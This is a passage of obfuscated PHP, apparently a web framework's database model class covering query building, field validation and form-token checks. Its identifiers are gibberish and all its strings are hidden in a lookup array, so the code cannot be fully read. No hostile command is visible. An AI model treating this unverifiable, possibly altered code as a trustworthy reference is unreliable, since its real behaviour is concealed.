$Í¾ÉÑ¯°); } else { $ñˆêÇ·[$¯ë»Æ¸] = $Í¾ÉÑ¯°; } $this->options[$ª‹ğË[275]] = $ñˆêÇ·; } $Í¾ÉÑ¯° = $this->_parseOptions(); if (is_array($Í¾ÉÑ¯°[$ª‹ğË[275]]) && isset($Í¾ÉÑ¯°[$ª‹ğË[275]][$¯ë»Æ¸])) { $Á•ô‰ÛÒ = $Í¾ÉÑ¯°[$ª‹ğË[275]][$¯ë»Æ¸]; } $½±†öáÖ = $this->db->delete($Í¾ÉÑ¯°); if (!1 !== $½±†öáÖ) { $ËÍ¹Æ = array(); if (isset($Á•ô‰ÛÒ)) { $ËÍ¹Æ[$¯ë»Æ¸] = $Á•ô‰ÛÒ; } $this->_after_delete($ËÍ¹Æ, $Í¾ÉÑ¯°); } return $½±†öáÖ; } protected function _after_delete($©ûŞÈ¤Ï, $­â³©Í) { } public function select($É³‹âŠ£ = array()) { $ˆœ£ÌÔù =& $_SERVER[§ŒØóıü]; if (is_string($É³‹âŠ£) || is_numeric($É³‹âŠ£)) { $¹µîç = $this->getPk(); if (strpos($É³‹âŠ£, $ˆœ£ÌÔù[50])) { $ÒŠ¯æâş[$¹µîç] = array($ˆœ£ÌÔù[276], $É³‹âŠ£); } else { $ÒŠ¯æâş[$¹µîç] = $É³‹âŠ£; } $this->options[$ˆœ£ÌÔù[275]] = $ÒŠ¯æâş; } elseif (!1 === $É³‹âŠ£) { $É³‹âŠ£ = $this->_parseOptions(); return $ˆœ£ÌÔù[277] . $this->db->buildSelectSql($É³‹âŠ£) . $ˆœ£ÌÔù[278]; } $É³‹âŠ£ = $this->_parseOptions(); $›Øğ÷²” = $this->db->select($É³‹âŠ£); if (!1 === $›Øğ÷²”) { return !1; } if (empty($›Øğ÷²”)) { return null; } $this->_afterSelect($›Øğ÷²”, $É³‹âŠ£); return $›Øğ÷²”; } protected function _afterSelect(&$Î¯Îû¡, $Ãû…”™ƒ) { } public function buildSql($Ø¿ŸìØ‚ = array()) { $°Ÿ‘¤”æ =& $_SERVER[§ŒØóıü]; $Ø¿ŸìØ‚ = $this->_parseOptions($Ø¿ŸìØ‚); return $°Ÿ‘¤”æ[277] . $this->db->buildSelectSql($Ø¿ŸìØ‚) . $°Ÿ‘¤”æ[278]; } public function optionsValue($Ëş¤ºø = null) { if (is_null($Ëş¤ºø)) { return $this->options; } elseif (is_array($Ëş¤ºø)) { $this->options = array_merge($this->options, $Ëş¤ºø); } } protected function _parseOptions($á­Ùàü¶ = array()) { $â£Ìü =& $_SERVER[§ŒØóıü]; if (is_array($á­Ùàü¶)) { $á­Ùàü¶ = array_merge($this->options, $á­Ùàü¶); } $this->options = array(); if (!isset($á­Ùàü¶[$â£Ìü[279]])) { $á­Ùàü¶[$â£Ìü[279]] = $this->getTableName(); $Æ¸çÍ÷ü = $this->fields; } else { $Æ¸çÍ÷ü = $this->getDbFields(); } if (!empty($á­Ùàü¶[$â£Ìü[280]])) { $á­Ùàü¶[$â£Ìü[279]] .= $â£Ìü[53] . $á­Ùàü¶[$â£Ìü[280]]; } $á­Ùàü¶[$â£Ìü[281]] = $this->name; if (isset($á­Ùàü¶[$â£Ìü[275]]) && is_array($á­Ùàü¶[$â£Ìü[275]]) && !empty($Æ¸çÍ÷ü) && !isset($á­Ùàü¶[$â£Ìü[282]]) && !isset($á­Ùàü¶[$â£Ìü[279]])) { foreach ($á­Ùàü¶[$â£Ìü[275]] as $á§´©¼ => $È£¤„ş¼) { $á§´©¼ = trim($á§´©¼); if (in_array($á§´©¼, $Æ¸çÍ÷ü, !0)) { if (is_scalar($È£¤„ş¼)) { $this->_parseType($á­Ùàü¶[$â£Ìü[275]], $á§´©¼); } } elseif (!is_numeric($á§´©¼) && $â£Ìü[11] != substr($á§´©¼, 0, 1) && !1 === strpos($á§´©¼, $â£Ìü[10]) && !1 === strpos($á§´©¼, $â£Ìü[260]) && !1 === strpos($á§´©¼, $â£Ìü[283]) && !1 === strpos($á§´©¼, $â£Ìü[284])) { unset($á­Ùàü¶[$â£Ìü[275]][$á§´©¼]); } } } $this->_options_filter($á­Ùàü¶); return $á­Ùàü¶; } protected function _options_filter(&$ÇÉÏµÃ­) { } protected function _parseType(&$ÌĞìçå, $áà¸µÏ») { $‚»±ôÏ =& $_SERVER[§ŒØóıü]; if (empty($this->options[$‚»±ôÏ[285]][$‚»±ôÏ[4] . $áà¸µÏ»])) { $ı÷óøÇ± = strtolower($this->fields[$‚»±ôÏ[252]][$áà¸µÏ»]); if (!1 !== strpos($ı÷óøÇ±, $‚»±ôÏ[286])) { } elseif (!1 === strpos($ı÷óøÇ±, $‚»±ôÏ[287]) && !1 !== strpos($ı÷óøÇ±, $‚»±ôÏ[288])) { $ÌĞìçå[$áà¸µÏ»] = intval($ÌĞìçå[$áà¸µÏ»]); } elseif (!1 !== strpos($ı÷óøÇ±, $‚»±ôÏ[289]) || !1 !== strpos($ı÷óøÇ±, $‚»±ôÏ[290])) { $ÌĞìçå[$áà¸µÏ»] = floatval($ÌĞìçå[$áà¸µÏ»]); } elseif (!1 !== strpos($ı÷óøÇ±, $‚»±ôÏ[291])) { $ÌĞìçå[$áà¸µÏ»] = (bool) $ÌĞìçå[$áà¸µÏ»]; } } } public function find($—Ü¼ÂÃœ = array()) { $øü£‚Šş =& $_SERVER[§ŒØóıü]; if (is_numeric($—Ü¼ÂÃœ) || is_string($—Ü¼ÂÃœ)) { $ÀğåŸ³ù[$this->getPk()] = intval($—Ü¼ÂÃœ); $this->options[$øü£‚Šş[275]] = $ÀğåŸ³ù; } $this->options[$øü£‚Šş[292]] = 1; $—Ü¼ÂÃœ = $this->_parseOptions(); $ÇÁ·º†’ = $this->db->select($—Ü¼ÂÃœ); if (!1 === $ÇÁ·º†’) { return !1; } if (empty($ÇÁ·º†’)) { return null; } $this->data = $ÇÁ·º†’[0]; $this->_afterFind($this->data, $—Ü¼ÂÃœ); if (!empty($this->options[$øü£‚Šş[293]])) { return $this->returnResult($this->data, $this->options[$øü£‚Šş[293]]); } return $this->data; } protected function _afterFind(&$«è®º§è, $û›ŠÃì) { } protected function returnResult($¹‡À•šº, $¥¤ˆøÕ€ = '') { $ÛîŞ‚ìÌ =& $_SERVER[§ŒØóıü]; if ($¥¤ˆøÕ€) { if (is_callable($¥¤ˆøÕ€)) { return call_user_func($¥¤ˆøÕ€, $¹‡À•šº); } switch (strtolower($¥¤ˆøÕ€)) { case $ÛîŞ‚ìÌ[294]: return json_encode($¹‡À•šº); case $ÛîŞ‚ìÌ[295]: return xml_encode($¹‡À•šº); } } return $¹‡À•šº; } public function parseFieldsMap($ú²£šŠÇ, $Èëüş‡Ê = 1) { if (!empty($this->_map)) { foreach ($this->_map as $šàøÑ¸ => $ ÒÙ¶â¹) { if ($Èëüş‡Ê == 1) { if (isset($ú²£šŠÇ[$ ÒÙ¶â¹])) { $ú²£šŠÇ[$šàøÑ¸] = $ú²£šŠÇ[$ ÒÙ¶â¹]; unset($ú²£šŠÇ[$ ÒÙ¶â¹]); } } else { if (isset($ú²£šŠÇ[$šàøÑ¸])) { $ú²£šŠÇ[$ ÒÙ¶â¹] = $ú²£šŠÇ[$šàøÑ¸]; unset($ú²£šŠÇ[$šàøÑ¸]); } } } } return $ú²£šŠÇ; } public function setField($ÛÖ¹–½÷, $âª³Œ“ä = '') { if (is_array($ÛÖ¹–½÷)) { $ì‡›üú = $ÛÖ¹–½÷; } else { $ì‡›üú[$ÛÖ¹–½÷] = $âª³Œ“ä; } return $this->save($ì‡›üú); } public function setAdd($Íç¼ªÕÏ, $µÑ•ú = 1) { $ÀÛ¹­ì™ =& $_SERVER[§ŒØóıü]; $¢½ìü¡– = $Íç¼ªÕÏ . $ÀÛ¹­ì™[296] . $µÑ•ú; if ($µÑ•ú < 0) { $¢½ìü¡– = $Íç¼ªÕÏ . $µÑ•ú; } return $this->setField($Íç¼ªÕÏ, array($ÀÛ¹­ì™[297], $¢½ìü¡–)); } public function getField($¬„üÁË„, $¤ÔşáŠµ = null) { $’õõ›îç =& $_SERVER[§ŒØóıü]; $Ú¡¸úÒô[$’õõ›îç[273]] = $¬„üÁË„; $Ú¡¸úÒô = $this->_parseOptions($Ú¡¸úÒô); $¬„üÁË„ = trim($¬„üÁË„); if (strpos($¬„üÁË„, $’õõ›îç[50])) { if (!isset($Ú¡¸úÒô[$’õõ›îç[292]])) { $Ú¡¸úÒô[$’õõ›îç[292]] = is_numeric($¤ÔşáŠµ) ? $¤ÔşáŠµ : $’õõ›îç[12]; } $Ğ½Ã˜ªà = $this->db->select($Ú¡¸úÒô); if (!empty($Ğ½Ã˜ªà)) { $é«ªÀœÎ = explode($’õõ›îç[50], $¬„üÁË„); $¬„üÁË„ = array_keys($Ğ½Ã˜ªà[0]); $™ı¨É¶¿ = array_shift($¬„üÁË„); $›‰‰×§’ = array_shift($¬„üÁË„); $Éãè‹‘± = array(); $–ÆÍ‡Ô¦ = count($é«ªÀœÎ); foreach ($Ğ½Ã˜ªà as $—ô ŞË) { $¢Ñ«– = $—ô ŞË[$™ı¨É¶¿]; if (2 == $–ÆÍ‡Ô¦) { $Éãè‹‘±[$¢Ñ«–] = $—ô ŞË[$›‰‰×§’]; } else { $Éãè‹‘±[$¢Ñ«–] = is_string($¤ÔşáŠµ) ? implode($¤ÔşáŠµ, $—ô ŞË) : $—ô ŞË; } } return $Éãè‹‘±; } } else { if (!0 !== $¤ÔşáŠµ) { $Ú¡¸úÒô[$’õõ›îç[292]] = is_numeric($¤ÔşáŠµ) ? $¤ÔşáŠµ : 1; } if ($¤ÔşáŠµ === $’õõ›îç[255]) { unset($Ú¡¸úÒô[$’õõ›îç[292]]); } $—ô ŞË = $this->db->select($Ú¡¸úÒô); if (!empty($—ô ŞË)) { if ($¤ÔşáŠµ === $’õõ›îç[255]) { return reset($—ô ŞË[0]); } if (!0 !== $¤ÔşáŠµ && 1 == $Ú¡¸úÒô[$’õõ›îç[292]]) { return reset($—ô ŞË[0]); } foreach ($—ô ŞË as $Ûñ‚¡˜æ) { $¨ßşµ´¨[] = $Ûñ‚¡˜æ[$¬„üÁË„]; } return $¨ßşµ´¨; } } return null; } public function create($™æ·ªÜ  = '', $ñµÇá•® = '') { $âµˆƒë =& $_SERVER[§ŒØóıü]; if (empty($™æ·ªÜ )) { $™æ·ªÜ  = $_POST; } elseif (is_object($™æ·ªÜ )) { $™æ·ªÜ  = get_object_vars($™æ·ªÜ ); } if (empty($™æ·ªÜ ) || !is_array($™æ·ªÜ )) { $this->error = think_lang($âµˆƒë[271]); return !1; } $™æ·ªÜ  = $this->parseFieldsMap($™æ·ªÜ , 0); $ñµÇá•® = $ñµÇá•® ? $ñµÇá•® : (!empty($™æ·ªÜ [$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$âµˆƒë[273]])) { $ì£Ñ†º = $this->options[$âµˆƒë[273]]; unset($this->options[$âµˆƒë[273]]); } elseif ($ñµÇá•® == THINK_MODEL_INSERT && isset($this->insertFields)) { $ì£Ñ†º = $this->insertFields; } elseif ($ñµÇá•® == THINK_MODEL_UPDATE && isset($this->updateFields)) { $ì£Ñ†º = $this->updateFields; } if (isset($ì£Ñ†º)) { if (is_string($ì£Ñ†º)) { $ì£Ñ†º = explode($âµˆƒë[50], $ì£Ñ†º); } if (think_config($âµˆƒë[298])) { $ì£Ñ†º[] = think_config($âµˆƒë[299]); } foreach ($™æ·ªÜ  as $…ÑÈÛ‘Ó => $ñ Ü ‰Ë) { if (!in_array($…ÑÈÛ‘Ó, $ì£Ñ†º)) { unset($™æ·ªÜ [$…ÑÈÛ‘Ó]); } } } if (!$this->autoValidation($™æ·ªÜ , $ñµÇá•®)) { return !1; } if (!$this->autoCheckToken($™æ·ªÜ )) { $this->error = think_lang($âµˆƒë[300]); return !1; } if ($this->autoCheckFields) { $ì£Ñ†º = $this->getDbFields(); foreach ($™æ·ªÜ  as $…ÑÈÛ‘Ó => $ñ Ü ‰Ë) { if (!in_array($…ÑÈÛ‘Ó, $ì£Ñ†º)) { unset($™æ·ªÜ [$…ÑÈÛ‘Ó]); } elseif (MAGIC_QUOTES_GPC && is_string($ñ Ü ‰Ë)) { $™æ·ªÜ [$…ÑÈÛ‘Ó] = stripslashes($ñ Ü ‰Ë); } } } $this->autoOperation($™æ·ªÜ , $ñµÇá•®); $this->data = $™æ·ªÜ ; return $™æ·ªÜ ; } public function autoCheckToken($Üœ¥»ƒÃ) { $–²èİş› =& $_SERVER[§ŒØóıü]; if (isset($this->options[$–²èİş›[301]]) && !$this->options[$–²èİş›[301]]) { return !0; } if (think_config($–²èİş›[298])) { $ÂèÕŒ“ = think_config($–²èİş›[299]); if (!isset($Üœ¥»ƒÃ[$ÂèÕŒ“]) || Session::get($ÂèÕŒ“)) { return !1; } list($Š‘®ÓÌˆ, $¿ï‡êÆ) = explode($–²èİş›[11], $Üœ¥»ƒÃ[$ÂèÕŒ“]); if ($¿ï‡êÆ && Session::get($ÂèÕŒ“ . $–²èİş›[10] . $Š‘®ÓÌˆ) === $¿ï‡êÆ) { Session::remove($ÂèÕŒ“ . $–²èİş›[10] . $Š‘®ÓÌˆ); return !0; } if (think_config($–²èİş›[302])) { Session::remove($ÂèÕŒ“ . $–²èİş›[10] . $Š‘®ÓÌˆ); } return !1; } return !0; } public function regex($§€—£‰Ö, $‹âìáß±) { $Øáé‚ãØ =& $_SERVER[§ŒØóıü]; $ìÍ½„€Ø = array($Øáé‚ãØ[303] => $Øáé‚ãØ[304], $Øáé‚ãØ[305] => $Øáé‚ãØ[306], $Øáé‚ãØ[307] => $Øáé‚ãØ[308], $Øáé‚ãØ[309] => $Øáé‚ãØ[310], $Øáé‚ãØ[311] => $Øáé‚ãØ[312], $Øáé‚ãØ[313] => $Øáé‚ãØ[314], $Øáé‚ãØ[315] => $Øáé‚ãØ[316], $Øáé‚ãØ[290] => $Øáé‚ãØ[317], $Øáé‚ãØ[318] => $Øáé‚ãØ[319]); if (isset($ìÍ½„€Ø[strtolower($‹âìáß±)])) { $‹âìáß± = $ìÍ½„€Ø[strtolower($‹âìáß±)]; } return preg_match($‹âìáß±, $§€—£‰Ö) === 1; } private function autoOperation(&$Ê”€áêÀ, $ò¹‘ÀÀ¯) { $„«ô«ÛÅ =& $_SERVER[§ŒØóıü]; if (!empty($this->options[$„«ô«ÛÅ[320]])) { $Â×Í´„© = $this->options[$„«ô«ÛÅ[320]]; unset($this->options[$„«ô«ÛÅ[320]]); } elseif (!empty($this->_auto)) { $Â×Í´„© = $this->_auto; } if (isset($Â×Í´„©)) { foreach ($Â×Í´„© as $·íæ›£Ä) { if (empty($·íæ›£Ä[2])) { $·íæ›£Ä[2] = THINK_MODEL_INSERT; } if ($ò¹‘ÀÀ¯ == $·íæ›£Ä[2] || $·íæ›£Ä[2] == THINK_MODEL_BOTH) { switch (trim($·íæ›£Ä[3])) { case $„«ô«ÛÅ[321]: case $„«ô«ÛÅ[322]: $å«İ¿ÁÍ = isset($·íæ›£Ä[4]) ? (array) $·íæ›£Ä[4] : array(); if (isset($Ê”€áêÀ[$·íæ›£Ä[0]])) { array_unshift($å«İ¿ÁÍ, $Ê”€áêÀ[$·íæ›£Ä[0]]); } if ($„«ô«ÛÅ[321] == $·íæ›£Ä[3]) { $Ê”€áêÀ[$·íæ›£Ä[0]] = call_user_func_array($·íæ›£Ä[1], $å«İ¿ÁÍ); } else { $Ê”€áêÀ[$·íæ›£Ä[0]] = call_user_func_array(array(&$this, $·íæ›£Ä[1]), $å«İ¿ÁÍ); } break; case $„«ô«ÛÅ[273]: $Ê”€áêÀ[$·íæ›£Ä[0]] = $Ê”€áêÀ[$·íæ›£Ä[1]]; break; case $„«ô«ÛÅ[323]: if ($„«ô«ÛÅ[12] === $Ê”€áêÀ[$·íæ›£Ä[0]]) { unset($Ê”€áêÀ[$·íæ›£Ä[0]]); } break; case $„«ô«ÛÅ[324]: default: $Ê”€áêÀ[$·íæ›£Ä[0]] = $·íæ›£Ä[1]; } if (!1 === $Ê”€áêÀ[$·íæ›£Ä[0]]) { unset($Ê”€áêÀ[$·íæ›£Ä[0]]); } } } } return $Ê”€áêÀ; } protected function autoValidation($¿”‹áÂ, $·Š€å ‚) { $¼şéâ™¶ =& $_SERVER[§ŒØóıü]; if (!empty($this->options[$¼şéâ™¶[325]])) { $ÀÔ¦Îò€ = $this->options[$¼şéâ™¶[325]]; unset($this->options[$¼şéâ™¶[325]]); } elseif (!empty($this->_validate)) { $ÀÔ¦Îò€ = $this->_validate; } if (isset($ÀÔ¦Îò€)) { if ($this->patchValidate) { $this->error = array(); } foreach ($ÀÔ¦Îò€ as $°İğ¸œ© => $öÒ–ÃÎ) { if (empty($öÒ–ÃÎ[5]) || $öÒ–ÃÎ[5] == THINK_MODEL_BOTH || $öÒ–ÃÎ[5] == $·Š€å ‚) { if (0 == strpos($öÒ–ÃÎ[2], $¼şéâ™¶[326]) && strpos($öÒ–ÃÎ[2], $¼şéâ™¶[327])) { $öÒ–ÃÎ[2] = think_lang(substr($öÒ–ÃÎ[2], 2, -1)); } $öÒ–ÃÎ[3] = isset($öÒ–ÃÎ[3]) ? $öÒ–ÃÎ[3] : THINK_EXISTS_VALIDATE; $öÒ–ÃÎ[4] = isset($öÒ–ÃÎ[4]) ? $öÒ–ÃÎ[4] : $¼şéâ™¶[328]; switch ($öÒ–ÃÎ[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($¿”‹áÂ, $öÒ–ÃÎ)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($¼şéâ™¶[12] != trim($¿”‹áÂ[$öÒ–ÃÎ[0]])) { if (!1 === $this->_validationField($¿”‹áÂ, $öÒ–ÃÎ)) { return !1; } } break; default: if (isset($¿”‹áÂ[$öÒ–ÃÎ[0]])) { if (!1 === $this->_validationField($¿”‹áÂ, $öÒ–ÃÎ)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($é’¡¨Ô§, $“¬ùÊÚ²) { if (!1 === $this->_validationFieldItem($é’¡¨Ô§, $“¬ùÊÚ²)) { if ($this->patchValidate) { $this->error[$“¬ùÊÚ²[0]] = $“¬ùÊÚ²[2]; } else { $this->error = $“¬ùÊÚ²[2]; return !1; } } return; } protected function _validationFieldItem($ÂƒÇ‡×Š, $Ù®ºôß«) { $İÎ¨Øšä =& $_SERVER[§ŒØóıü]; switch (strtolower(trim($Ù®ºôß«[4]))) { case $İÎ¨Øšä[321]: case $İÎ¨Øšä[322]: $¦Û´ñ£‹ = isset($Ù®ºôß«[6]) ? (array) $Ù®ºôß«[6] : array(); if (is_string($Ù®ºôß«[0]) && strpos($Ù®ºôß«[0], $İÎ¨Øšä[50])) { $Ù®ºôß«[0] = explode($İÎ¨Øšä[50], $Ù®ºôß«[0]); } if (is_array($Ù®ºôß«[0])) { foreach ($Ù®ºôß«[0] as $Ëà×ñ”ö) { $ƒª¨‰‹ã[$Ëà×ñ”ö] = $ÂƒÇ‡×Š[$Ëà×ñ”ö]; } array_unshift($¦Û´ñ£‹, $ƒª¨‰‹ã); } else { array_unshift($¦Û´ñ£‹, $ÂƒÇ‡×Š[$Ù®ºôß«[0]]); } if ($İÎ¨Øšä[321] == $Ù®ºôß«[4]) { return call_user_func_array($Ù®ºôß«[1], $¦Û´ñ£‹); } else { return call_user_func_array(array(&$this, $Ù®ºôß«[1]), $¦Û´ñ£‹); } case $İÎ¨Øšä[329]: return $ÂƒÇ‡×Š[$Ù®ºôß«[0]] == $ÂƒÇ‡×Š[$Ù®ºôß«[1]]; case $İÎ¨Øšä[330]: if (is_string($Ù®ºôß«[0]) && strpos($Ù®ºôß«[0], $İÎ¨Øšä[50])) { $Ù®ºôß«[0] = explode($İÎ¨Øšä[50], $Ù®ºôß«[0]); } $òƒ¿¥õß = array(); if (is_array($Ù®ºôß«[0])) { foreach ($Ù®ºôß«[0] as $Ëà×ñ”ö) { $òƒ¿¥õß[$Ëà×ñ”ö] = $ÂƒÇ‡×Š[$Ëà×ñ”ö]; } } else { $òƒ¿¥õß[$Ù®ºôß«[0]] = $ÂƒÇ‡×Š[$Ù®ºôß«[0]]; } if (!empty($ÂƒÇ‡×Š[$this->getPk()])) { $òƒ¿¥õß[$this->getPk()] = array($İÎ¨Øšä[331], $ÂƒÇ‡×Š[$this->getPk()]); } if ($this->where($òƒ¿¥õß)->find()) { return !1; } return !0; default: return $this->check($ÂƒÇ‡×Š[$Ù®ºôß«[0]], $Ù®ºôß«[1], $Ù®ºôß«[4]); } } public function check($©’Û’¿Ğ, $ˆ É‡ıÆ, $º‘“öÃ» = "\162\145\147\x65\x78") { $©ÕÙœô± =& $_SERVER[§ŒØóıü]; $º‘“öÃ» = strtolower(trim($º‘“öÃ»)); switch ($º‘“öÃ») { case $©ÕÙœô±[7]: case $©ÕÙœô±[332]: $Áí’´ø² = is_array($ˆ É‡ıÆ) ? $ˆ É‡ıÆ : explode($©ÕÙœô±[50], $ˆ É‡ıÆ); return $º‘“öÃ» == $©ÕÙœô±[7] ? in_array($©’Û’¿Ğ, $Áí’´ø²) : !in_array($©’Û’¿Ğ, $Áí’´ø²); case $©ÕÙœô±[333]: case $©ÕÙœô±[334]: if (is_array($ˆ É‡ıÆ)) { $Ë°±ãØ = $ˆ É‡ıÆ[0]; $…˜¥ó×ş = $ˆ É‡ıÆ[1]; } else { list($Ë°±ãØ, $…˜¥ó×ş) = explode($©ÕÙœô±[50], $ˆ É‡ıÆ); } return $º‘“öÃ» == $©ÕÙœô±[333] ? $©’Û’¿Ğ >= $Ë°±ãØ && $©’Û’¿Ğ <= $…˜¥ó×ş : $©’Û’¿Ğ < $Ë°±ãØ || $©’Û’¿Ğ > $…˜¥ó×ş; case $©ÕÙœô±[335]: case $©ÕÙœô±[336]: return $º‘“öÃ» == $©ÕÙœô±[335] ? $©’Û’¿Ğ == $ˆ É‡ıÆ : $©’Û’¿Ğ != $ˆ É‡ıÆ; case $©ÕÙœô±[337]: $ıÕ†³Ü¥ = mb_strlen($©’Û’¿Ğ, $©ÕÙœô±[338]); if (strpos($ˆ É‡ıÆ, $©ÕÙœô±[50])) { list($Ë°±ãØ, $…˜¥ó×ş) = explode($©ÕÙœô±[50], $ˆ É‡ıÆ); return $ıÕ†³Ü¥ >= $Ë°±ãØ && $ıÕ†³Ü¥ <= $…˜¥ó×ş; } else { return $ıÕ†³Ü¥ == $ˆ É‡ıÆ; } case $©ÕÙœô±[339]: list($°î™ò‚ƒ, $×˜ã÷¯) = explode($©ÕÙœô±[50], $ˆ É‡ıÆ); if (!is_numeric($°î™ò‚ƒ)) { $°î™ò‚ƒ = strtotime($°î™ò‚ƒ); } if (!is_numeric($×˜ã÷¯)) { $×˜ã÷¯ = strtotime($×˜ã÷¯); } return NOW_TIME >= $°î™ò‚ƒ && NOW_TIME <= $×˜ã÷¯; case $©ÕÙœô±[340]: return in_array(get_client_ip(), explode($©ÕÙœô±[50], $ˆ É‡ıÆ)); case $©ÕÙœô±[341]: return !in_array(get_client_ip(), explode($©ÕÙœô±[50], $ˆ É‡ıÆ)); case $©ÕÙœô±[328]: default: return $this->regex($©’Û’¿Ğ, $ˆ É‡ıÆ); } } public function query($¹™ˆÁı¹, $‹ç‚Ïâá = false) { $Œ—´ŸÖ =& $_SERVER[§ŒØóıü]; if (!is_bool($‹ç‚Ïâá) && !is_array($‹ç‚Ïâá)) { $‹ç‚Ïâá = func_get_args(); array_shift($‹ç‚Ïâá); } $¹™ˆÁı¹ = str_replace(array($Œ—´ŸÖ[231], $Œ—´ŸÖ[342]), $Œ—´ŸÖ[53], $¹™ˆÁı¹); $¹™ˆÁı¹ = $this->parseSql($¹™ˆÁı¹, $‹ç‚Ïâá); return $this->db->query($¹™ˆÁı¹); } public function execute($²šü‡‰, $”ÃüœÀ¤ = false) { if (!is_bool($”ÃüœÀ¤) && !is_array($”ÃüœÀ¤)) { $”ÃüœÀ¤ = func_get_args(); array_shift($”ÃüœÀ¤); } $²šü‡‰ = $this->parseSql($²šü‡‰, $”ÃüœÀ¤); return $this->db->execute($²šü‡‰); } protected function parseSql($ÅàºøÑ…, $Šİæ‚Â) { $Ñ¨÷ŞªÙ =& $_SERVER[§ŒØóıü]; if (!0 === $Šİæ‚Â) { $Ò ºÍ”µ = $this->_parseOptions(); $ÅàºøÑ… = $this->db->parseSql($ÅàºøÑ…, $Ò ºÍ”µ); } elseif (is_array($Šİæ‚Â)) { $Šİæ‚Â = array_map(array($this->db, $Ñ¨÷ŞªÙ[343]), $Šİæ‚Â); $ÅàºøÑ… = vsprintf($ÅàºøÑ…, $Šİæ‚Â); } else { $ÅàºøÑ… = strtr($ÅàºøÑ…, array($Ñ¨÷ŞªÙ[344] => $this->getTableName(), $Ñ¨÷ŞªÙ[345] => think_config($Ñ¨÷ŞªÙ[244]))); } $this->db->setModel($this->name); return $ÅàºøÑ…; } public function db($ óË÷¬ö = '', $‰šÇ÷Ê™ = '', $óõ ÚÅö = array()) { $¡Úõ­äß =& $_SERVER[§ŒØóıü]; if ($¡Úõ­äß[12] === $ óË÷¬ö && $this->db) { return $this->db; } static $¢×Éß®ë = array(); static $‚îº©˜÷ = array(); if (!isset($‚îº©˜÷[$ óË÷¬ö]) || isset($‚îº©˜÷[$ óË÷¬ö]) && $‰šÇ÷Ê™ && $¢×Éß®ë[$ óË÷¬ö] != $‰šÇ÷Ê™) { if (!empty($‰šÇ÷Ê™) && is_string($‰šÇ÷Ê™) && !1 === strpos($‰šÇ÷Ê™, $¡Úõ­äß[8])) { $‰šÇ÷Ê™ = think_config($‰šÇ÷Ê™); } $ óË÷¬ö = think_guid($‰šÇ÷Ê™); $‚îº©˜÷[$ óË÷¬ö] = Db::getInstance($‰šÇ÷Ê™); } elseif (NULL === $‰šÇ÷Ê™) { $‚îº©˜÷[$ óË÷¬ö]->close(); unset($‚îº©˜÷[$ óË÷¬ö]); return; } if (!empty($óõ ÚÅö)) { if (is_string($óõ ÚÅö)) { parse_str($óõ ÚÅö, $óõ ÚÅö); } foreach ($óõ ÚÅö as $“Ø®Åç => $‰†©‡ƒ) { $this->setProperty($“Ø®Åç, $‰†©‡ƒ); } } $¢×Éß®ë[$ óË÷¬ö] = $‰šÇ÷Ê™; $this->db = $‚îº©˜÷[$ óË÷¬ö]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $ÎÍ–äÍà = get_class($this); if ($ÎÍ–äÍà == $_SERVER[§ŒØóıü][346]) { return $this->name; } $this->name = substr($ÎÍ–äÍà, 0, -5); } return $this->name; } public function getTableName() { $¿–­’œ =& $_SERVER[§ŒØóıü]; if (empty($this->trueTableName)) { $Äääç€ = !empty($this->tablePrefix) ? $this->tablePrefix : $¿–­’œ[12]; if (!empty($this->tableName)) { $Äääç€ .= $this->tableName; } else { $Äääç€ .= think_parse_name($this->name); } $this->trueTableName = strtolower($Äääç€); } return (!empty($this->dbName) ? $this->dbName . $¿–­’œ[10] : $¿–­’œ[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $ÄõŒ°ˆÇ =& $_SERVER[§ŒØóıü]; return isset($this->fields[$ÄõŒ°ˆÇ[251]]) ? $this->fields[$ÄõŒ°ˆÇ[251]] : $this->pk; } public function getDbFields() { $± Õğüº =& $_SERVER[§ŒØóıü]; if (isset($this->options[$± Õğüº[279]])) { $‰Éƒğ¹ = $this->db->getFields($this->options[$± Õğüº[279]]); return $‰Éƒğ¹ ? array_keys($‰Éƒğ¹) : !1; } if ($this->fields) { $‰Éƒğ¹ = $this->fields; unset($‰Éƒğ¹[$± Õğüº[250]], $‰Éƒğ¹[$± Õğüº[251]], $‰Éƒğ¹[$± Õğüº[252]], $‰Éƒğ¹[$± Õğüº[249]]); return $‰Éƒğ¹; } return !1; } public function data($‡ß£³È = '') { $‹í‘Äàë =& $_SERVER[§ŒØóıü]; if ($‹í‘Äàë[12] === $‡ß£³È && !empty($this->data)) { return $this->data; } if (is_object($‡ß£³È)) { $‡ß£³È = get_object_vars($‡ß£³È); } elseif (is_string($‡ß£³È)) { parse_str($‡ß£³È, $‡ß£³È); } elseif (!is_array($‡ß£³È)) { think_exception(think_lang($‹í‘Äàë[271])); } $this->data = $‡ß£³È; return $this; } public function join($Âìƒ†·) { $Î¼ÅÊúß =& $_SERVER[§ŒØóıü]; if (is_array($Âìƒ†·)) { $this->options[$Î¼ÅÊúß[282]] = $Âìƒ†·; } elseif (!empty($Âìƒ†·)) { $this->options[$Î¼ÅÊúß[282]][] = $Âìƒ†·; } return $this; } public function union($Š´¡ÄÊ, $¹ï¹§’ê = false) { $÷å¨ñ =& $_SERVER[§ŒØóıü]; if (empty($Š´¡ÄÊ)) { return $this; } if ($¹ï¹§’ê) { $this->options[$÷å¨ñ[347]][$÷å¨ñ[348]] = !0; } if (is_object($Š´¡ÄÊ)) { $Š´¡ÄÊ = get_object_vars($Š´¡ÄÊ); } if (is_string($Š´¡ÄÊ)) { $¾ö—“àÚ = $Š´¡ÄÊ; } elseif (is_array($Š´¡ÄÊ)) { if (isset($Š´¡ÄÊ[0])) { $this->options[$÷å¨ñ[347]] = array_merge($this->options[$÷å¨ñ[347]], $Š´¡ÄÊ); return $this; } else { $¾ö—“àÚ = $Š´¡ÄÊ; } } else { think_exception(think_lang($÷å¨ñ[271])); } 